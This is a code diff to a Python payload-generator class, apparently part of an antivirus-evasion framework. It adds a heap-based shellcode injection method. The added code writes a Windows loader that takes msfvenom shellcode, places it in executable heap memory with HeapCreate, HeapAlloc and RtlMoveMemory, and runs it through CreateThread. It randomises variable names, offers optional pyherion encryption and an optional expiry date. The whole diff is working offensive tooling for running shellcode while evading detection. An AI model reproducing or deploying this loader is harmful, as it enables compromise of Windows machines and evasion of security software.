@@ -39,7 +39,7 @@ class Payload:
         # options we require user interaction for- format is {Option : [Value, Description]]}
         self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
                                  "use_pyherion" : ["N", "Use the pyherion encrypter"],
-                                 "inject_method" : ["virtual", "[virtual]alloc or [void]pointer"],
+                                 "inject_method" : ["Virtual", "Virtual, Void, or Heap"],
                                  "expire_payload" : ["X", "Optional: Payloads expire after \"X\" days"]}
         
     def generate(self):
@@ -101,6 +101,72 @@ class Payload:
 
                 if self.required_options["use_pyherion"][0].lower() == "y":
                     PayloadCode = encryption.pyherion(PayloadCode)
+
+                return PayloadCode
+
+        if self.required_options["inject_method"][0].lower() == "heap":
+            if self.required_options["expire_payload"][0].lower() == "x":
+
+                # Generate Shellcode Using msfvenom
+                Shellcode = self.shellcode.generate()
+        
+                # Generate Random Variable Names
+                ShellcodeVariableName = helpers.randomString()
+                RandPtr = helpers.randomString()
+                RandBuf = helpers.randomString()
+                RandHt = helpers.randomString()
+                HeapVar = helpers.randomString()
+        
+                # Create Payload code
+                PayloadCode = 'import ctypes\n'
+                PayloadCode += ShellcodeVariableName +' = bytearray(\'' + Shellcode + '\')\n'
+                PayloadCode += HeapVar + ' = ctypes.windll.kernel32.HeapCreate(ctypes.c_int(0x00040000),ctypes.c_int(len(' + ShellcodeVariableName + ') * 2),ctypes.c_int(0))\n'
+                PayloadCode += RandPtr + ' = ctypes.windll.kernel32.HeapAlloc(ctypes.c_int(' + HeapVar + '),ctypes.c_int(0x00000008),ctypes.c_int(len( ' + ShellcodeVariableName + ')))\n'
+                PayloadCode += RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n'
+                PayloadCode += 'ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n'
+                PayloadCode += RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
+                PayloadCode += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'
+
+                if self.required_options["use_pyherion"][0].lower() == "y":
+                    PayloadCode = crypters.pyherion(PayloadCode)
+
+                return PayloadCode
+
+            else:
+
+                # Get our current date and add number of days to the date
+                todaysdate = date.today()
+                expiredate = str(todaysdate + timedelta(days=int(self.required_options["expire_payload"][0])))
+
+                # Generate Shellcode Using msfvenom
+                Shellcode = self.shellcode.generate()
+        
+                # Generate Random Variable Names
+                ShellcodeVariableName = helpers.randomString()
+                RandPtr = helpers.randomString()
+                RandBuf = helpers.randomString()
+                RandHt = helpers.randomString()
+                HeapVar = helpers.randomString()
+                RandToday = helpers.randomString()
+                RandExpire = helpers.randomString()
+        
+                # Create Payload code
+                PayloadCode = 'import ctypes\n'
+                PayloadCode += 'from datetime import datetime\n'
+                PayloadCode += 'from datetime import date\n\n'
+                PayloadCode += RandToday + ' = datetime.now()\n'
+                PayloadCode += RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
+                PayloadCode += 'if ' + RandToday + ' < ' + RandExpire + ':\n'
+                PayloadCode += '\t' + ShellcodeVariableName +' = bytearray(\'' + Shellcode + '\')\n'
+                PayloadCode += '\t' + HeapVar + ' = ctypes.windll.kernel32.HeapCreate(ctypes.c_int(0x00040000),ctypes.c_int(len(' + ShellcodeVariableName + ') * 2),ctypes.c_int(0))\n'
+                PayloadCode += '\t' + RandPtr + ' = ctypes.windll.kernel32.HeapAlloc(ctypes.c_int(' + HeapVar + '),ctypes.c_int(0x00000008),ctypes.c_int(len( ' + ShellcodeVariableName + ')))\n'
+                PayloadCode += '\t' + RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n'
+                PayloadCode += '\tctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n'
+                PayloadCode += '\t' + RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
+                PayloadCode += '\tctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'
+
+                if self.required_options["use_pyherion"][0].lower() == "y":
+                    PayloadCode = crypters.pyherion(PayloadCode)
 
                 return PayloadCode
 
